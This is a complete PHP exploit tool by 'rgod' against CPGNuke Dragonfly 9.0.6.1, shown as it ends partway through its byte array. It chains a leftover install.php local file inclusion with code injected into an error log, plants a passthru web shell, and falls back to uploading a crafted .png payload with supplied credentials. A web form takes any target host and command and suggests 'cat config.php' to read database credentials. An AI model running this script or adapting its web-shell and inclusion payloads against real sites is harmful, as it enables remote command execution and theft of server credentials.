<?php
#   ---dragonfly9.0.6.1_incl_xpl.php                     20.15 07/02/2006      #
#                                                                              #
#  CPGNuke Dragonfly 9.0.6.1 remote commands execution through arbitrary local #
#  inclusion - (Sun-Tzu Drangonfly killing) -                                  #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  -> this works regardless of magic_quotes_gpc settings                       #
#                                                                              #
#  Sun-Tzu: "Thus it may be known that the leader of armies is the arbiter of  #
#  the people's fate, the man on whom it depends whether the nation shall be   #
#  in peace or in peril."

/*
  a short explaination:
  install.php is not deleted after dragonfly installation, you cannot use it
  to modify settings but we have a local inclusion bug in it at lines 33-49:

    ...
    if (isset($_GET['newlang'])) {
          setcookie('installlang',$_GET['newlang']);
	   $currentlang = $_GET['newlang'];
    } elseif (isset($_COOKIE['installlang'])) {
          $currentlang = $_COOKIE['installlang'];
    }
    $instlang = array();
    if (file_exists("install/language/$currentlang.php")) {
          require("install/language/$currentlang.php");
    } else {
  	   require('install/language/english.php');
    }
    if (file_exists("language/$currentlang/main.php")) {
          require("language/$currentlang/main.php");
    } else {
          require('language/english/main.php');
    }
    ...

 poc:
 http://[target]/[path]/install.php?newlang=../../cpg_error.log%00

 we are using backslashes and a null char, but this works with magic_quotes_gpc
 both on and off because of dragonfly magic quotes disable code...

 also you can do that through cookies...

 GET /[PATH]/install.php HTTP/1.1
 Cookie: installlang=../../cpg_error.log%00;
 Host: [target]
 Connection: Close

 There are two ways to inject arbitrary code in dragonfly resources:

 i) in cpg_error.log, poc:

 http://[target]/[path]/error.php?<?passthru($_GET[cmd]);?>
 http://[target]/[path]/install.php?cmd=ls%20-la&newlang=../../cpg_error.log%00

 this works with $error_log = true in error.php (not the default)
 some problems with spaces, converted as %20 so this way works with
 allow_short_open_tag = On in php.ini

 ii) uploading a malicious .png file in modules/coppermine/albums/userpics/
 dir. We will search for a php[some hex values].tmp file, you have to supply
 valid credentials with upload rights to do that...by default, any user can
 upload

 however you can try manually including some database file or Apache log... use
 your imagination
                                                                              */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);
ignore_user_abort(0);

echo'<html><head><title>**CPGNuke Dragonfly 9.0.6.1 remote commands execution***
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
***CPGNuke Dragonfly 9.0.6.1 remote commands execution***</p><p class="Stile6">a
script  by  rgod  at    <a href="http://retrogod.altervista.org"target="_blank">
http://retrogod.altervista.org</a></p><table width="84%"><tr><td    width="43%">
<form name="form1" method="post"   action="'.$_SERVER[PHP_SELF].'">    <p><input
type="text"  name="host"> <span class="Stile5">* target    (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/cpgnuke/ or just / ) </span></p><p><input type="text" name="CMD">         <span
class="Stile5"> * specify a command ("cat config.php" to see database username &
password...)</span></p><p><input type="text" name="ULOGIN"><span class="Stile5">
a valid USER with upload rights for Coppermine (by default any...)   </span></p>
<p><input type="text" name="USER_PASSWORD"><span class="Stile5"> ... and PASSWOR
D, required for STEP 3 and following... </span>  </p>  <p>  <input   type="text"
name="port"><span class="Stile5">specify  a  port other than  80 (default value)
</span></p><p><input type="text" name="pRoXy"><span class="Stile5">send  exploit
through an HTTP proxy (ip:port)</span></p><p> <input type="submit" name="Submit"
value="go!"></p></form></td></tr></table></body></html>';

function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '<table border="0"><tr>';
  while ($ii <= strlen($headeri)-1){
    $dAtAi=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbsp;&nbsp;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($dAtAi)==1) {
      echo "<td>0".htmlentities($dAtAi)."</td>";
    }
    else {
      echo "<td>".htmlentities($dAtAi)."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".htmlentities($headeri[$li])."</td>";
  }
  echo "</tr></table>";
}

$pRoXy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //2x speed
{
  global $pRoXy, $host, $port, $pAcKeT, $HtMl, $pRoXy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
  }
  else {
    $c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {echo 'Not a valid prozy...';
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($pRoXy=='') {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $HtMl= '';
    socket_write($socket, $pAcKeT, strlen($pAcKeT));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}
    echo nl2br(htmlentities($HtMl));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function sendpacketii($pAcKeT,$show)
{
  global $pRoXy, $host, $port, $HtMl, $pRoXy_regex;
  if ($pRoXy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.htmlentities($host); die;
    }
  }
  else {
	$c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {
      echo 'Not a valid prozy...';die;
    }
    $parts=explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$pAcKeT);
  if ($pRoXy=='') {
    $HtMl='';
    while (!feof($ock)) {
      $HtMl.=fgets($ock);
    }
  }
  else {
    $HtMl='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {
      $HtMl.=fread($ock,1);
    }
  }
  fclose($ock);
  echo nl2br(htmlentities($HtMl));
  }

function refresh()
{
  flush();
  ob_flush();
  usleep(100000);
}
  $host=$_POST[host];$port=$_POST[port];
  $path=$_POST[path];$CMD=$_POST[CMD];
  $pRoXy=$_POST[pRoXy];$ULOGIN=$_POST[ULOGIN];
  $USER_PASSWORD=$_POST[USER_PASSWORD];

  if (($host<>'') and ($path<>'') and ($CMD<>''))
  {
    $port=intval(trim($port));
    if ($port=='') {$port=80;}
    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}
    if ($pRoXy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
    $host=str_replace("\r\n","",$host);
    $path=str_replace("\r\n","",$path);
    $CMD=urlencode($CMD);

    # STEP 0 -> look for a suntzu.tmp file (checking if exploit has already succeeded...
    $pAcKeT="GET ".$p."suntzu.tmp HTTP/1.1\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    show($pAcKeT);
    sendpacketii($pAcKeT);
    if (eregi("filename:",$HtMl)) {
             echo("Exploit already launched and succeeded...Now launch desired command...");
             $temp=explode("filename:",$HtMl);
             $temp2=explode(".tmp",$temp[1]);
             $filename=$temp2[0].".tmp";
             $filepath="../../modules/coppermine/albums/userpics/".$filename.chr(0x00);
             $filepath=urlencode($filepath);
             $pAcKeT="GET ".$p."install.php?cmd=$CMD&newlang=$filepath HTTP/1.1\r\n";
             $pAcKeT.="Host: ".$host."\r\n";
             $pAcKeT.="User-Agent: GoogleBot 1.1\r\n";
             $pAcKeT.="Connection: Close\r\n\r\n";
             show($pAcKeT);
             sendpacketii($pAcKeT);die;
				   }

    # STEP 1 -> try to inject a shell in cpg_error.log,
    # this works with $error_log = true in error.php (not the default)
    # some problems with spaces, converted as %20 so this works with allow_short_open_tag on
    $SHELL="<?ob_clean();echo\"HiMaster!\";ini_set(\"max_execution_time\",0);";
    $SHELL.="passthru(\$HTTP_GET_VARS[cmd]);die;?>";
    $pAcKeT="GET ".$p."error.php?$SHELL HTTP/1.1\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="User-Agent: Gameboy, Powered by Nintendo\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    show($pAcKeT);
    sendpacketii($pAcKeT);

    # STEP 2 -> Arbitrary local inclusion... launch commands
    # install.php is still present after installation, it looses its functions
    # when cpgnuke is already installed but we have an inclusion bug in it
    $logfile="../../cpg_error.log".chr(0x00);
    $logfile=urlencode($logfile);
    $pAcKeT="GET ".$p."install.php?cmd=$CMD&newlang=$logfile HTTP/1.1\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="User-Agent: GoogleBot 1.1\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    show($pAcKeT);
    sendpacketii($pAcKeT);
    if (!eregi("200 OK",$HtMl)) {die("Can't find install.php on target server...<br>");}
    if (eregi("HiMaster!",$HtMl)) {echo "Exploit succeeded...<br>";die;}
			     else {echo "STEP 2 failed..., trying STEP 3...";}

    #STEP 3 -> If STEP 2 failed, trying to upload a malicious .png file -> firstly login to retrieve a cookie
    #          and prepare an album to upload pictures in
    if ($ULOGIN=="") {die("I need a valid username to launch STEP 3...");}
    if ($USER_PASSWORD=="") {die("I need a valid username to launch STEP 3...");}

    $COOKIE="CMSSESSID=db7ad9bfbbe33f543b52716742805ff7;";
    $dAtA="------------wX253BHGef0yW2bSsgs8Po\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"ulogin\"\r\n\r\n";
    $dAtA.=$ULOGIN."\r\n";
    $dAtA.="------------wX253BHGef0yW2bSsgs8Po\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"user_password\"\r\n\r\n";
    $dAtA.=$USER_PASSWORD."\r\n";
    $dAtA.="------------wX253BHGef0yW2bSsgs8Po--\r\n";
    $pAcKeT="POST ".$p."index.php?name=coppermine&file=albmgr&cat=10002 HTTP/1.1\r\n";
    $pAcKeT.="User-Agent: Mag-Net\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="Accept: */*\r\n";
    $pAcKeT.="Cookie: $COOKIE\r\n";
    $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
    $pAcKeT.="Content-Type: multipart/form-data; boundary=----------wX253BHGef0yW2bSsgs8Po\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    $pAcKeT.=$dAtA;
    show($pAcKeT);
    sendpacketii($pAcKeT);
    $temp=explode("Set-Cookie: ",$HtMl);
    $temp2=explode(' ',$temp[1]);
    $cookie1=$temp2[0]."path=/";
    $temp2=explode(' ',$temp[2]);
    $cookie2=$temp2[0]."path=/";
    $temp2=explode(' ',$temp[3]);
    $cookie3=$temp2[0]."path=/";
    $COOKIE=$cookie1.$cookie2.$cookie3;
    $COOKIE=str_replace("path=/"," ",$COOKIE);
    echo'<br>cookie: -> '.htmlentities($COOKIE).'<br><br>';

    $dAtA="------------tZ299BnwgKutccIBEFpGvM\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"cat\"\r\n\r\n";
    $dAtA.="0\r\n";
    $dAtA.="------------tZ299BnwgKutccIBEFpGvM\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"mode\"\r\n\r\n";
    $dAtA.="addalb\r\n";
    $dAtA.="------------tZ299BnwgKutccIBEFpGvM\r\n";
    $dAtA.="Content-Disposition: form-data; name=\"title\"\r\n\r\n";
    $dAtA.="SUNTZU\r\n";
    $dAtA.="------------tZ299BnwgKutccIBEFpGvM--\r\n";
    $pAcKeT="POST ".$p."index.php?name=coppermine&file=albmgr HTTP/1.1\r\n";
    $pAcKeT.="User-Agent: Suntzu preparing his shit\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="Cookie: $COOKIE\r\n";
    $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
    $pAcKeT.="Content-Type: multipart/form-data; boundary=----------tZ299BnwgKutccIBEFpGvM\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    $pAcKeT.=$dAtA;
    show($pAcKeT);
    sendpacketii($pAcKeT);

    $pAcKeT="GET ".$p."index.php?name=coppermine&file=upload HTTP/1.1\r\n";
    $pAcKeT.="Host: ".$host."\r\n";
    $pAcKeT.="User-Agent: Suntzu looking is family photos\r\n";
    $pAcKeT.="Cookie: $COOKIE\r\n";
    $pAcKeT.="Connection: Close\r\n\r\n";
    show($pAcKeT);
    sendpacketii($pAcKeT);
    $temp=explode("\">* SUNTZU",$HtMl);
    $temp2=explode("\"",$temp[0]);
    $album=$temp2[count($temp2)-1];
    echo'<br>album: -> '.htmlentities($album).'<br><br>';

    # STEP 4 -> Upload shell... this requires you have upload rights and GD library installed
    # on target server... obviously if Coppermine works, GD is active

    #the evil .png file, huge, but it works for me...
    $SHELL=chr(137).chr(80). chr(78). chr(71). chr(13). chr(10). chr(26). chr(10).
           chr(0).  chr(0).  chr(0).  chr(13). chr(73). chr(72). chr(68). chr(82).
           chr(0).  chr(0).  chr(0).  chr(100).chr(0).  chr(0).  chr(0).  chr(100).
           chr(8).  chr(2).  chr(0).  chr(0).  chr(0).  chr(255).chr(128).chr(2).
           chr(3).  chr(0).  chr(0).  chr(0).  chr(9).  chr(112).chr(72). chr(89).
           chr(115).chr(0).  chr(0).  chr(11). chr(19). chr(0).  chr(0).  chr(11).
           chr(19). chr(1).  chr(0).  chr(154).chr(156).chr(24). chr(0).  chr(0).
           chr(12). chr(38). chr(73). chr(68). chr(65). chr(84). chr(120).chr(156).
           chr(221).chr(93). chr(203).chr(118).chr(236).chr(54). chr(12). chr(163).
           chr(206).chr(241).chr(47). chr(118).chr(215).chr(117).chr(255).chr(255).
           chr(15). chr(216).chr(133).chr(45). chr(17). chr(36). chr(65). chr(73).
           chr(246).chr(120).chr(114).chr(211).chr(178).chr(189).chr(25). chr(91).
           chr(47). chr(75). chr(8).  chr(0).  chr(83). chr(206).chr(76). chr(210).
           chr(254).chr(254).chr(231).chr(175).chr(214).chr(154).chr(136).chr(180).
           chr(43). chr(198).chr(225).chr(121).chr(32). chr(77). chr(154).chr(196).
           chr(211).chr(244).chr(159).chr(200).chr(104).chr(32). chr(98). chr(7).
           chr(189).chr(82). chr(198).chr(89). chr(63). chr(190).chr(94). chr(123).
           chr(123).chr(139).chr(84). chr(224).chr(67). chr(69). chr(207).chr(23).
           chr(90). chr(162).chr(118).chr(6).  chr(231).chr(42). chr(34). chr(122).
           chr(126).chr(177).chr(175).chr(162).chr(26). chr(202).chr(84). chr(123).
           chr(243).chr(179).chr(74). chr(213).chr(154).chr(156).chr(71). chr(71).
           chr(235).chr(243).chr(107).chr(253).chr(127).chr(193).chr(131).chr(11).
           chr(9).  chr(249).chr(45). chr(96). chr(125).chr(43). chr(148).chr(30).
           chr(134).chr(56). chr(2).  chr(157).chr(34). chr(179).chr(174).chr(37).
           chr(182).chr(8).  chr(226).chr(244).chr(107).chr(117).chr(234).chr(193).
           chr(18). chr(121).chr(5).  chr(172).chr(122).chr(109).chr(119).chr(162).
           chr(209).chr(195).chr(16). chr(43). chr(176).chr(222).chr(149).chr(161).
           chr(155).chr(76). chr(163).chr(19). chr(187).chr(13). chr(214).chr(15).
           chr(82). chr(241).chr(192).chr(139).chr(182).chr(75). chr(110).chr(242).
           chr(123).chr(61). chr(235).chr(71). chr(67). chr(241).chr(85). chr(145).
           chr(89). chr(151).chr(230).chr(194).chr(81). chr(80). chr(217).chr(176).
           chr(48). chr(145).chr(255).chr(44). chr(88). chr(58). chr(57). chr(243).
           chr(209).chr(174).chr(202).chr(62). chr(109).chr(46). chr(67). chr(68).
           chr(197).chr(49). chr(11). chr(129).chr(154).chr(123).chr(214).chr(192).
           chr(37). chr(41). chr(240).chr(13). chr(176).chr(86). chr(70). chr(53).
           chr(133).chr(96). chr(121).chr(61). chr(45). chr(42). chr(211).chr(221).
           chr(176).chr(147).chr(12). chr(152).chr(98). chr(216).chr(221).chr(144).
           chr(225).chr(53). chr(38). chr(65). chr(201).chr(25). chr(252).chr(98).
           chr(41). chr(85). chr(172).chr(90). chr(61). chr(226).chr(39). chr(96).
           chr(164).chr(177).chr(72). chr(68). chr(8).  chr(179).chr(68). chr(192).
           chr(187).chr(64). chr(134).chr(145).chr(63). chr(255).chr(3).  chr(207).
           chr(82). chr(131).chr(66). chr(195).chr(165).chr(91). chr(120).chr(61).
           chr(227).chr(24). chr(120).chr(180).chr(38). chr(30). chr(55). chr(113).
           chr(6).  chr(127).chr(53). chr(113).chr(2).  chr(196).chr(176).chr(22).
           chr(120).chr(250).chr(7).  chr(192).chr(42). chr(20). chr(72). chr(18).
           chr(41). chr(184).chr(248).chr(226).chr(170).chr(42). chr(151).chr(193).
           chr(119).chr(141).chr(97). chr(15). chr(184).chr(45). chr(118).chr(253).
           chr(173).chr(100).chr(232).chr(71). chr(104).chr(97). chr(68). chr(230).
           chr(89). chr(97). chr(190).chr(123).chr(211).chr(230).chr(11). chr(89).
           chr(15). chr(160).chr(132).chr(54). chr(139).chr(129).chr(250).chr(54).
           chr(64). chr(134).chr(247).chr(30). chr(173).chr(243).chr(198).chr(25).
           chr(124).chr(208).chr(219).chr(253).chr(187).chr(161).chr(248).chr(3).
           chr(230).chr(89). chr(5).  chr(67). chr(249).chr(74). chr(234).chr(216).
           chr(91). chr(122).chr(171).chr(106).chr(148).chr(52). chr(25). chr(55).
           chr(193).chr(108).chr(240).chr(96). chr(79). chr(72). chr(40). chr(102).
           chr(240).chr(130).chr(64). chr(133).chr(251).chr(224).chr(84). chr(134).
           chr(236).chr(226).chr(175).chr(201).chr(144).chr(174).chr(62). chr(142).
           chr(195).chr(64). chr(193).chr(51). chr(117).chr(101).chr(28). chr(208).
           chr(195).chr(101).chr(162).chr(1).  chr(171).chr(193).chr(177).chr(134).
           chr(88). chr(100).chr(94). chr(13). chr(224).chr(2).  chr(86). chr(107).
           chr(25). chr(190).chr(224).chr(231).chr(90). chr(172).chr(62). chr(4).
           chr(43). chr(198).chr(61). chr(121).chr(147).chr(25). chr(160).chr(103).
           chr(13). chr(164).chr(14). chr(205).chr(221).chr(252).chr(156).chr(73).
           chr(1).  chr(86). chr(168).chr(79). chr(55). chr(172).chr(151).chr(225).
           chr(111).chr(218).chr(238).chr(104).chr(60). chr(66). chr(43). chr(194).
           chr(254).chr(126).chr(40). chr(69). chr(240).chr(84). chr(228).chr(100).
           chr(22). chr(138).chr(13). chr(9).  chr(36). chr(240).chr(149).chr(24).
           chr(60). chr(147).chr(100).chr(224).chr(82). chr(19). chr(130).chr(147).
           chr(3).  chr(235).chr(161).chr(12). chr(183).chr(119).chr(207).chr(234).
           chr(152).chr(23). chr(39). chr(153).chr(6).  chr(196).chr(151).chr(150).
           chr(112).chr(60). chr(220).chr(72). chr(6).  chr(74). chr(200).chr(21).
           chr(112).chr(129).chr(17). chr(36). chr(103).chr(240).chr(189).chr(157).
           chr(239).chr(80). chr(206).chr(241).chr(54). chr(88). chr(204).chr(145).
           chr(230).chr(233).chr(122).chr(105).chr(237).chr(189).chr(12). chr(115).
           chr(172).chr(132).chr(166).chr(194).chr(63). chr(76). chr(74). chr(45).
           chr(135).chr(176).chr(14). chr(49). chr(117).chr(176).chr(171).chr(7).
           chr(17). chr(62). chr(204).chr(179).chr(110).chr(7).  chr(235).chr(20).
           chr(213).chr(67). chr(67). chr(173).chr(161).chr(107).chr(97). chr(107).
           chr(206).chr(15). chr(20). chr(197).chr(180).chr(113).chr(50). chr(203).
           chr(122).chr(153).chr(14). chr(141).chr(89). chr(97). chr(50). chr(147).
           chr(212).chr(193).chr(183).chr(132).chr(239).chr(80). chr(41). chr(195).
           chr(107).chr(192).chr(16). chr(31). chr(57). chr(62). chr(32). chr(226).
           chr(202).chr(92). chr(177).chr(54). chr(82). chr(45). chr(50). chr(182).
           chr(205).chr(194).chr(16). chr(212).chr(235).chr(169).chr(195).chr(176).
           chr(229).chr(22). chr(112).chr(145).chr(196).chr(44). chr(184).chr(172).
           chr(65). chr(222).chr(124).chr(123).chr(236).chr(78). chr(101).chr(248).
           chr(178).chr(193).chr(251).chr(206).chr(154).chr(152).chr(149).chr(160).
           chr(105).chr(213).chr(153).chr(175).chr(240).chr(91). chr(160).chr(38).
           chr(77). chr(228).chr(192).chr(53). chr(184).chr(44). chr(194).chr(154).
           chr(2).  chr(78). chr(209).chr(210).chr(3).  chr(245).chr(88). chr(234).
           chr(144).chr(152).chr(85). chr(47). chr(229).chr(227).chr(80). chr(239).
           chr(81). chr(185).chr(190).chr(73). chr(76). chr(16). chr(232).chr(217).
           chr(53). chr(103).chr(242).chr(60). chr(107).chr(172).chr(172).chr(1).
           chr(38). chr(129).chr(89). chr(17). chr(154).chr(152).chr(164).chr(58).
           chr(120).chr(240).chr(128).chr(232).chr(239).chr(171).chr(204).chr(74).
           chr(233).chr(129).chr(175).chr(207).chr(58). chr(109).chr(41). chr(219).
           chr(130).chr(51). chr(204).chr(193).chr(6).  chr(179).chr(58). chr(32).
           chr(45). chr(172).chr(121).chr(160).chr(97). chr(120).chr(70). chr(208).
           chr(220).chr(81). chr(201).chr(44). chr(88). chr(76). chr(94). chr(222).
           chr(188).chr(32). chr(198).chr(236).chr(222).chr(7).  chr(88). chr(240).
           chr(113).chr(154).chr(184).chr(135).chr(13). chr(50). chr(114).chr(90).
           chr(47). chr(214).chr(150).chr(177).chr(107).chr(253).chr(167).chr(59).
           chr(76). chr(109).chr(145).chr(47). chr(43). chr(102).chr(37). chr(69).
           chr(74). chr(170).chr(220).chr(98). chr(214).chr(50). chr(102).chr(93).
           chr(188).chr(174).chr(206).chr(208).chr(120).chr(226).chr(111).chr(42).
           chr(158).chr(89). chr(231).chr(97). chr(67). chr(148).chr(196).chr(8).
           chr(121).chr(224).chr(170).chr(91). chr(68). chr(103).chr(76). chr(161).
           chr(2).  chr(205).chr(230).chr(72). chr(153).chr(21). chr(23). chr(151).
           chr(121).chr(116).chr(159).chr(89). chr(57). chr(124).chr(134).chr(30).
           chr(7).  chr(104).chr(216).chr(176).chr(65). chr(123).chr(150).chr(199).
           chr(251).chr(28). chr(214).chr(235).chr(16). chr(55). chr(210).chr(0).
           chr(16). chr(90). chr(22). chr(122).chr(22). chr(178).chr(194).chr(243).
           chr(75). chr(18). chr(130).chr(173).chr(60). chr(67). chr(102).chr(189).
           chr(18). chr(134).chr(0).  chr(27). chr(18). chr(160).chr(9).  chr(62).
           chr(154).chr(220).chr(205).chr(223).chr(31). chr(20). chr(218).chr(156).
           chr(24). chr(30). chr(136).chr(81). chr(35). chr(138).chr(28). chr(85).
           chr(210).chr(177).chr(243).chr(139).chr(117).chr(103).chr(243).chr(12).
           chr(254).chr(59). chr(204).chr(210).chr(26). chr(167).chr(107).chr(192).
           chr(88). chr(175).chr(222).chr(145).chr(122).chr(141).chr(74). chr(115).
           chr(164).chr(115).chr(140).chr(107).chr(42). chr(167).chr(193).chr(215).
           chr(4).  chr(1).  chr(116).chr(90). chr(174).chr(117).chr(252).chr(18).
           chr(113).chr(85). chr(214).chr(41). chr(249).chr(231).chr(27). chr(204).
           chr(2).  chr(139).chr(89). chr(36). chr(11). chr(233).chr(169).chr(132).
           chr(104).chr(51). chr(120).chr(112).chr(60). chr(4).  chr(65). chr(147).
           chr(84). chr(155).chr(228).chr(189).chr(225).chr(121).chr(228).chr(180).
           chr(41). chr(110).chr(125).chr(17). chr(32). chr(174).chr(187).chr(221).
           chr(189).chr(33). chr(225).chr(26). chr(105).chr(4).  chr(177).chr(226).
           chr(81). chr(108).chr(237).chr(161).chr(84). chr(111).chr(106).chr(65).
           chr(191).chr(40). chr(216).chr(179).chr(145).chr(130).chr(12). chr(165).
           chr(146).chr(33). chr(26). chr(60). chr(232).chr(171).chr(18). chr(32).
           chr(35). chr(80). chr(109).chr(87). chr(43). chr(252).chr(166).chr(49).
           chr(231).chr(209).chr(8).  chr(142).chr(169).chr(162).chr(234).chr(131).
           chr(24). chr(45). chr(131).chr(7).  chr(49). chr(218).chr(109).chr(177).
           chr(203).chr(144).chr(249).chr(116).chr(198).chr(136).chr(56). chr(20).
           chr(19). chr(32). chr(199).chr(83). chr(200).chr(217).chr(123).chr(6).
           chr(47). chr(34). chr(49). chr(99). chr(72). chr(152).chr(2).  chr(167).
           chr(58). chr(72). chr(40). chr(198).chr(200).chr(56). chr(149).chr(19).
           chr(188).chr(36). chr(67). chr(167).chr(177).chr(62). chr(78). chr(233).
           chr(226).chr(141).chr(162).chr(194).chr(177).chr(146).chr(5).  chr(92).
           chr(95). chr(55). chr(120).chr(216).chr(203).chr(24). chr(80). chr(205).
           chr(227).chr(170).chr(131).chr(41). chr(225).chr(190).chr(217).chr(166).
           chr(50). chr(148).chr(86). chr(229).chr(71). chr(11). chr(25). chr(178).
           chr(62). chr(220).chr(203).chr(202).chr(101).chr(61). chr(15). chr(42).
           chr(76). chr(135).chr(160).chr(187).chr(27). chr(88). chr(41). chr(147).
           chr(225).chr(5).  chr(148).chr(39). chr(148).chr(136).chr(158).chr(18).
           chr(197).chr(55). chr(134).chr(112).chr(185).chr(85). chr(229).chr(48).
           chr(22). chr(193).chr(232).chr(183).chr(200).chr(176).chr(211).chr(68).
           chr(83). chr(75). chr(42). chr(195).chr(145).chr(103).chr(104).chr(108).
           chr(171).chr(138).chr(169).chr(67). chr(152).chr(63). chr(161).chr(146).
           chr(176).chr(162).chr(154).chr(65). chr(177).chr(39). chr(173).chr(126).
           chr(95). chr(134).chr(17). chr(53). chr(124).chr(245).chr(119).chr(67).
           chr(160).chr(86). chr(11). chr(206).chr(5).  chr(44). chr(235).chr(229).
           chr(45). chr(166).chr(14). chr(182).chr(4).  chr(2).  chr(19). chr(23).
           chr(163).chr(235).chr(205).chr(172).chr(234).chr(115).chr(56). chr(230).
           chr(225).chr(147).chr(238).chr(148).chr(85). chr(73). chr(118).chr(174).
           chr(36). chr(64). chr(185).chr(208).chr(1).  chr(104).chr(228).chr(146).
           chr(99). chr(255).chr(70). chr(92). chr(158).chr(37). chr(1).  chr(38).
           chr(155).chr(4).  chr(206).chr(200).chr(159).chr(149).chr(179).chr(173).
           chr(219).chr(172).chr(90). chr(220).chr(139).chr(226).chr(209).chr(3).
           chr(168).chr(47). chr(26). chr(21). chr(244).chr(242).chr(144).chr(141).
           chr(54). chr(165).chr(103).chr(141).chr(111).chr(193).chr(177).chr(68).
           chr(138).chr(122).chr(86). chr(152).chr(91). chr(110).chr(176).chr(225).
           chr(89). chr(188).chr(108).chr(1).  chr(97). chr(121).chr(239).chr(123).
           chr(146).chr(58). chr(176).chr(12). chr(190).chr(39). chr(13). chr(226).
           chr(32). chr(59). chr(47). chr(123).chr(140).chr(25). chr(54). chr(50).
           chr(89). chr(246).chr(112).chr(56). chr(76). chr(102).chr(177).chr(184).
           chr(149).chr(103).chr(205).chr(123).chr(179).chr(241).chr(98). chr(151).
           chr(185).chr(103).chr(133).chr(43). chr(121).chr(207).chr(138).chr(101).
           chr(0).  chr(89). chr(166).chr(152).chr(246).chr(164).chr(52). chr(207).
           chr(61). chr(59). chr(111).chr(154).chr(237).chr(140).chr(40). chr(51).
           chr(207).chr(122).chr(57). chr(156).chr(243).chr(144).chr(115).chr(108).
           chr(229).chr(41). chr(195).chr(202).chr(122).chr(243).chr(134).chr(6).
           chr(216).chr(191).chr(27). chr(199).chr(98). chr(129).chr(19). chr(231).
           chr(34). chr(115).chr(222).chr(194).chr(232).chr(117).chr(244).chr(112).
           chr(182).chr(225).chr(150).chr(143).chr(39). chr(228).chr(28). chr(202).
           chr(26). chr(81). chr(31). chr(12). chr(115).chr(26). chr(60). chr(40).
           chr(208).chr(247).chr(95). chr(1).  chr(83). chr(156).chr(237).chr(244).
           chr(216).chr(239).chr(87). chr(69). chr(249).chr(108).chr(121).chr(165).
           chr(70). chr(17). chr(110).chr(240).chr(126).chr(8).  chr(141).chr(71).
